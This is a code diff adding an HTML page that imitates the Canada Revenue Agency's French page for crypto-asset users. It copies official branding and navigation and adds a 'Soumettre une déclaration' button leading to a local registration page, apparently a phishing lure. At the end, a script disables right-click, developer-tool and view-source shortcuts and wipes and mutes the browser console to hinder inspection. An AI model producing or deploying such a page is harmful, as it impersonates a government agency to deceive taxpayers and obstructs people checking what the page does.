@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Renseignements pour les utilisateurs de crypto-actifs et les fiscalistes - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            color: #333;
+        }
+        .container-custom {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .btn-cra-blue {
+            background-color: #26374a;
+            color: white;
+            padding: 8px 15px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .search-container {
+            display: flex;
+            align-items: center;
+        }
+        .search-input {
+            border: 1px solid #ccc;
+            padding: 6px 10px;
+            width: 250px;
+        }
+        .search-button {
+            background-color: #26374a;
+            color: white;
+            padding: 6px 12px;
+            border: 1px solid #26374a;
+        }
+        .nav-bar {
+            background-color: #26374a;
+            height: auto;
+            border-top: 3px solid #38414d;
+        }
+        .nav-bar a {
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .nav-bar a:hover {
+            background-color: #1a2633;
+        }
+        .gcweb-menu {
+            position: relative;
+            margin: 0;
+        }
+        .gcweb-menu button[aria-haspopup="true"] {
+            background-color: #26374a;
+            border: 1px solid #26374a;
+            color: #fff;
+            padding: 0.5em 1em;
+            text-transform: uppercase;
+            font-size: 20px;
+        }
+        .gcweb-menu button[aria-haspopup="true"]:hover,
+        .gcweb-menu button[aria-haspopup="true"][aria-expanded="true"] {
+            background-color: #444;
+            border-color: #444;
+        }
+        .gcweb-menu [aria-haspopup="true"][aria-expanded="false"] + [role="menu"] {
+            display: none;
+        }
+        .gcweb-menu button[aria-haspopup="true"][aria-expanded="true"] + [role="menu"] {
+            display: block;
+            z-index: 9999;
+        }
+        .gcweb-menu [role="menu"] {
+            background-color: #444;
+            color: #fff;
+            list-style: none;
+            padding: 0;
+            position: absolute;
+            margin: 0;
+        }
+        .gcweb-menu [role="menu"] > li {
+            border-left: #444 solid 1px;
+        }
+        .gcweb-menu [role="menu"] > li:first-child {
+            border-top: #444 solid 1px;
+        }
+        .gcweb-menu [role="menu"] > li:last-child {
+            border-bottom: #444 solid 1px;
+        }
+        .gcweb-menu [role="menuitem"] {
+            display: block;
+            padding: 14px 30px;
+            width: 360px;
+            border-bottom: 1px solid #555;
+            color: #fff;
+            font-size: 18px;
+            text-decoration: none;
+        }
+        .gcweb-menu [role="menuitem"]:visited {
+            color: #fff;
+        }
+        .gcweb-menu li:last-child [role="menuitem"] {
+            border-bottom: none;
+        }
+        .gcweb-menu [role="menuitem"]:hover,
+        .gcweb-menu [role="menuitem"]:focus {
+            background-color: #fff;
+            color: #333;
+        }
+        /* Submenu styles - WHITE background, click-based */
+        .gcweb-menu [role="presentation"] {
+            position: relative;
+        }
+        .gcweb-menu .sm-submenu {
+            display: none;
+            position: absolute;
+            left: 360px;
+            top: 0;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            min-width: 300px;
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            z-index: 10000;
+        }
+        .gcweb-menu [role="presentation"] > a[aria-expanded="true"] + .sm-submenu {
+            display: block;
+        }
+        .gcweb-menu .sm-submenu [role="menuitem"] {
+            width: 300px;
+            font-size: 16px;
+            padding: 12px 20px;
+            color: #284162;
+            background-color: #fff;
+            border-bottom: 1px solid #e1e1e1;
+        }
+        .gcweb-menu .sm-submenu [role="menuitem"]:visited {
+            color: #284162;
+        }
+        .gcweb-menu .sm-submenu [role="menuitem"]:hover,
+        .gcweb-menu .sm-submenu [role="menuitem"]:focus {
+            background-color: #e1e1e1;
+            color: #000;
+        }
+        /* Mobile responsive menu */
+        @media (max-width: 768px) {
+            .gcweb-menu [role="menuitem"] {
+                width: 100%;
+                max-width: 100vw;
+                font-size: 16px;
+                padding: 12px 20px;
+            }
+            .gcweb-menu .sm-submenu {
+                position: relative;
+                left: 0;
+                width: 100%;
+                max-width: 100vw;
+                border-left: 3px solid #26374a;
+                margin-left: 20px;
+            }
+            .gcweb-menu .sm-submenu [role="menuitem"] {
+                width: 100%;
+                font-size: 14px;
+                padding: 10px 20px;
+            }
+            .gcweb-menu [role="menu"] {
+                width: 100vw;
+                max-width: 100vw;
+            }
+        }
+        .breadcrumb-item {
+            display: inline-flex;
+            align-items: center;
+            color: #335075;
+        }
+        .breadcrumb-item i {
+            margin: 0 10px;
+            font-size: 10px;
+            color: #333;
+        }
+        .red-accent {
+            border-bottom: 4px solid #af3c43;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .info-callout {
+            border-left: 5px solid #31708f;
+            background-color: #fff;
+            padding: 10px 0 10px 20px;
+            display: flex;
+            margin-bottom: 30px;
+        }
+        .info-callout i {
+            color: #31708f;
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        .feedback-box {
+            background-color: #f5f5f5;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 40px;
+            border-radius: 4px;
+        }
+        .btn-feedback {
+            background-color: #335075;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="bg-white">
+
+    <!-- Top Header -->
+    <header class="py-6">
+        <div class="container-custom flex justify-between items-start">
+            <div class="flex flex-col">
+                <div class="flex justify-end mb-4 md:hidden">
+                     <a href="index.html" class="text-[#335075] hover:underline text-sm font-semibold underline">English</a>
+                </div>
+                <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-fr.svg" alt="Gouvernement du Canada" class="h-10">
+            </div>
+            <div class="hidden md:flex flex-col items-end">
+                <a href="index.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">English</a>
+                <div class="search-container">
+                    <input type="text" placeholder="Rechercher dans l'ARC" class="search-input">
+                    <button class="search-button">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Nav Bar -->
+    <nav class="nav-bar">
+        <div class="container-custom flex justify-between items-center h-full">
+            <div class="gcweb-menu">
+                <button type="button" aria-haspopup="true" aria-expanded="false">
+                    <span>MENU</span>
+                    <span class="glyphicon glyphicon-chevron-down"><i class="fas fa-caret-down"></i></span>
+                </button>
+                <ul role="menu" aria-orientation="vertical">
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-jobs" aria-expanded="false" href="#">Emplois et milieu de travail</a>
+                        <ul id="gc-mnu-jobs" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.guichetemplois.gc.ca/findajob">Guichet-Emplois</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/emplois/opportunites/gouvernement.html">Emplois au gouvernement du Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/emploi-developpement-social/services/nas.html">Obtenir un numéro d'assurance sociale (NAS)</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-cit" aria-expanded="false" href="#">Immigration et citoyenneté</a>
+                        <ul id="gc-mnu-cit" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/immigration-refugies-citoyennete/services/visiter-canada.html">Visiter le Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/immigration-refugies-citoyennete/services/immigrer-canada.html">Immigrer au Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/immigration-refugies-citoyennete/services/passeports-canadiens.html">Passeports et documents de voyage</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-travel" aria-expanded="false" href="#">Voyage et tourisme</a>
+                        <ul id="gc-mnu-travel" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://voyage.gc.ca/voyager/avertissements">Conseils aux voyageurs et avertissements</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/immigration-refugies-citoyennete/services/visiter-canada.html">Visiter le Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://voyage.gc.ca/assistance/assistance-d-urgence">Assistance à l'étranger</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-biz" aria-expanded="false" href="#">Entreprises et industrie</a>
+                        <ul id="gc-mnu-biz" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/entreprises/lancer.html">Démarrer une entreprise</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/entreprises/impots.html">Impôts des entreprises</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://ised-isde.canada.ca/cc/lgcy/fdrlCrpSrch.html?locale=fr_CA">Recherche de sociétés</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-benny" aria-expanded="false" href="#">Prestations</a>
+                        <ul id="gc-mnu-benny" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/prestations/ae.html">Prestations d'assurance-emploi</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/prestations/dentaire/regime-soins-dentaires.html">Régime canadien de soins dentaires</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/prestations/famille.html">Prestations familiales</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-health" aria-expanded="false" href="#">Santé</a>
+                        <ul id="gc-mnu-health" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/sante/aliments-nutrition.html">Aliments et nutrition</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/sante-publique/services/maladies.html">Maladies et affections</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://recalls-rappels.canada.ca/fr">Rappels et avis de sécurité</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-taxes" aria-expanded="false" href="#">Impôts</a>
+                        <ul id="gc-mnu-taxes" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/agence-revenu/services/services-electroniques/services-ouverture-session-arc.html">Ouvrir une session ARC</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/impots/impot-sur-le-revenu.html">Impôt sur le revenu</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/agence-revenu/services/impot/entreprises/sujets/tps-tvh-entreprises.html">TPS/TVH</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/agence-revenu/services/paiements.html">Paiements</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-env" aria-expanded="false" href="#">Environnement et ressources naturelles</a>
+                        <ul id="gc-mnu-env" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/environnement/meteo.html">Météo et risques naturels</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/environnement/energie.html">Énergie</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://meteo.gc.ca/canada_f.html">Prévisions météorologiques locales</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-def" aria-expanded="false" href="#">Sécurité nationale et défense</a>
+                        <ul id="gc-mnu-def" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/defense/securitenationale.html">Sécurité nationale</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/defense/fac.html">Forces armées canadiennes</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://forces.ca/fr/carrieres/">Emplois dans les Forces</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-culture" aria-expanded="false" href="#">Culture, histoire et sport</a>
+                        <ul id="gc-mnu-culture" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/patrimoine-canadien/services/financement.html">Financement - Culture, histoire et sport</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/culture/sport.html">Sport</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/culture/histoire-patrimoine.html">Histoire et patrimoine</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-police" aria-expanded="false" href="#">Services de police, justice et urgences</a>
+                        <ul id="gc-mnu-police" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/police/police.html">Services de police</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/police/justice.html">Justice</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://grc.ca/fr/armes-feu">Permis d'armes à feu</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-trans" aria-expanded="false" href="#">Transport et infrastructure</a>
+                        <ul id="gc-mnu-trans" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/fr/aviation">Aviation</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/fr/transport-maritime">Transport maritime</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://tc.canada.ca/fr/aviation/securite-des-drones">Sécurité des drones</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-world" aria-expanded="false" href="#">Canada et le monde</a>
+                        <ul id="gc-mnu-world" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.international.gc.ca/world-monde/international_relations-relations_internationales/index.aspx?lang=fra">Politique étrangère du Canada</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://voyage.gc.ca/assistance/ambassades-consulats">Ambassades et consulats</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://international.canada.ca/fr/services/entreprises/commerce">Commerce international</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-money" aria-expanded="false" href="#">Argent et finances</a>
+                        <ul id="gc-mnu-money" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/finance/gerer.html">Gérer votre argent</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/finance/dette.html">Dettes et emprunts</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/finance/epargner.html">Épargnes et investissements</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-science" aria-expanded="false" href="#">Science et innovation</a>
+                        <ul id="gc-mnu-science" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/science/financement-recherches.html">Financement de la recherche</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/science/innovation.html">R-D et innovation</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://nrc.canada.ca/fr/certifications-evaluations-normes/codes-canada/publications-codes-canada">Codes du bâtiment</a></li>
+                        </ul>
+                    </li>
+                    <li role="presentation">
+                        <a role="menuitem" tabindex="-1" aria-haspopup="true" aria-controls="gc-mnu-life" aria-expanded="false" href="#">Gérer les événements de la vie</a>
+                        <ul id="gc-mnu-life" role="menu" class="sm-submenu">
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/evenements-vie/enfant.html">Accueillir un enfant</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/evenements-vie/retraite.html">Planifier votre retraite</a></li>
+                            <li role="presentation"><a role="menuitem" tabindex="-1" href="https://www.canada.ca/fr/services/evenements-vie/deces.html">Quoi faire lors d'un décès</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+            <a href="https://www.canada.ca/fr/agence-revenu.html" target="_blank" class="bg-[#26374a] px-4 h-full font-bold text-white flex items-center">
+                Ouvrir une session ARC
+            </a>
+        </div>
+    </nav>
+
+    <!-- Breadcrumbs -->
+    <div class="bg-white py-3 border-b border-gray-100">
+        <div class="container-custom text-sm">
+            <nav class="flex items-center space-x-0">
+                <a href="#" class="text-[#335075] hover:underline">Canada.ca</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="text-[#335075] hover:underline">Agence du revenu du Canada (ARC)</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="text-[#335075] hover:underline">Conformité et application de l'ARC</a>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container-custom py-10">
+        <div class="red-accent">
+            <h1 class="text-4xl font-bold pb-2">Renseignements pour les utilisateurs de crypto-actifs et les fiscalistes</h1>
+        </div>
+
+        <div class="space-y-6 text-lg mb-8 max-w-5xl">
+            <p>
+                Depuis 2008, l'industrie des crypto-actifs continue d'évoluer en fonction des innovations dans ce domaine et de son adoption accrue dans le monde entier. L'Agence du revenu du Canada (ARC) a donc publié des directives fiscales pour clarifier le traitement fiscal des activités de crypto-actifs et veille à mettre à jour ses pages Web à mesure que les développements émergent.
+            </p>
+            <p>
+                Les pages Web ci-dessous fournissent des renseignements fiscaux généraux relatifs aux crypto-actifs. Vous trouverez également des liens vers des renseignements plus techniques.
+            </p>
+        </div>
+
+        <!-- Submit Return Button -->
+        <div class="mb-10">
+            <button onclick="window.location.href='register-fr.html'" class="bg-[#335075] text-white px-6 py-3 rounded text-lg font-bold hover:bg-[#26374a] transition duration-200">
+                Soumettre une déclaration
+            </button>
+        </div>
+
+        <!-- Info Callout -->
+        <div class="info-callout">
+            <i class="fas fa-info-circle"></i>
+            <p class="text-lg text-gray-700">
+                Les descriptions ci-dessous font référence à des termes tels qu'ils sont couramment compris dans l'industrie des crypto-actifs et sont fournies à titre informatif seulement. L'ARC n'exprime aucune opinion ou position en présentant ces renseignements.
+            </p>
+        </div>
+
+        <!-- Grid Sections -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-10 mb-16">
+            <!-- Item 1 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Comprendre les crypto-actifs et vos obligations fiscales</div>
+                <p class="text-gray-700">Les crypto-actifs et leurs attributs à des fins fiscales</p>
+            </div>
+            <!-- Item 2 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Tenue de livres et registres de crypto-actifs pour la production de déclarations</div>
+                <p class="text-gray-700">Livres et registres de crypto-actifs à conserver aux fins de production de déclarations</p>
+            </div>
+            <!-- Item 3 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Détermination de la valeur des crypto-actifs pour la production de déclarations</div>
+                <p class="text-gray-700">Évaluation de vos crypto-actifs</p>
+            </div>
+            <!-- Item 4 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Déclaration de revenus provenant d'opérations de crypto-actifs</div>
+                <p class="text-gray-700">Répercussions fiscales des opérations courantes impliquant des crypto-actifs</p>
+            </div>
+            <!-- Item 5 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Déclaration de revenus provenant d'activités de minage et de jalonnement</div>
+                <p class="text-gray-700">Répercussions fiscales du minage et du jalonnement de crypto-actifs</p>
+            </div>
+            <!-- Item 6 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Perception et versement de la TPS/TVH sur les opérations de crypto-actifs</div>
+                <p class="text-gray-700">Opérations pouvant avoir des répercussions sur la TPS/TVH</p>
+            </div>
+        </div>
+
+        <!-- Feedback Section -->
+        <div class="feedback-box">
+            <span class="font-bold text-gray-800">Avez-vous trouvé ce que vous cherchiez?</span>
+            <button class="btn-feedback">Oui</button>
+            <button class="btn-feedback">Non</button>
+        </div>
+
+        <div class="mt-10 mb-20">
+            <p class="text-gray-600 text-sm">Date de modification : 2023-12-13</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#26374a] text-white py-16 border-t-8 border-[#af3c43]">
+        <div class="container-custom">
+            <h2 class="text-2xl font-bold">Agence du revenu du Canada (ARC)</h2>
+        </div>
+    </footer>
+
+    <script>
+        // Dropdown menu functionality
+        document.addEventListener('DOMContentLoaded', function() {
+            const menuButton = document.querySelector('.gcweb-menu button');
+            const dropdown = document.querySelector('.gcweb-menu [role="menu"]');
+            
+            if (menuButton && dropdown) {
+                menuButton.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    const isExpanded = this.getAttribute('aria-expanded') === 'true';
+                    this.setAttribute('aria-expanded', !isExpanded);
+                });
+                
+                // Close dropdown when clicking outside
+                document.addEventListener('click', function(e) {
+                    if (!e.target.closest('.gcweb-menu')) {
+                        menuButton.setAttribute('aria-expanded', 'false');
+                        // Close all submenus when closing main menu
+                        document.querySelectorAll('.gcweb-menu [aria-controls]').forEach(function(link) {
+                            link.setAttribute('aria-expanded', 'false');
+                        });
+                    }
+                });
+                
+                // Close dropdown on escape key
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape') {
+                        menuButton.setAttribute('aria-expanded', 'false');
+                        menuButton.focus();
+                        // Close all submenus
+                        document.querySelectorAll('.gcweb-menu [aria-controls]').forEach(function(link) {
+                            link.setAttribute('aria-expanded', 'false');
+                        });
+                    }
+                });
+            }
+            
+            // Submenu click handling - click-based persistence
+            document.querySelectorAll('.gcweb-menu [aria-controls]').forEach(function(categoryLink) {
+                categoryLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isExpanded = this.getAttribute('aria-expanded') === 'true';
+                    
+                    // Close all other submenus
+                    document.querySelectorAll('.gcweb-menu [aria-controls]').forEach(function(link) {
+                        if (link !== categoryLink) {
+                            link.setAttribute('aria-expanded', 'false');
+                        }
+                    });
+                    
+                    // Toggle this submenu
+                    this.setAttribute('aria-expanded', !isExpanded);
+                });
+            });
+        });
+    </script>
+
+    <script>
+        // Anti-scraping protection
+        (function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                    (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console logs periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Disable console functions
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            console.debug = function() {};
+        })();
+    </script>
+
+</body>
+</html>
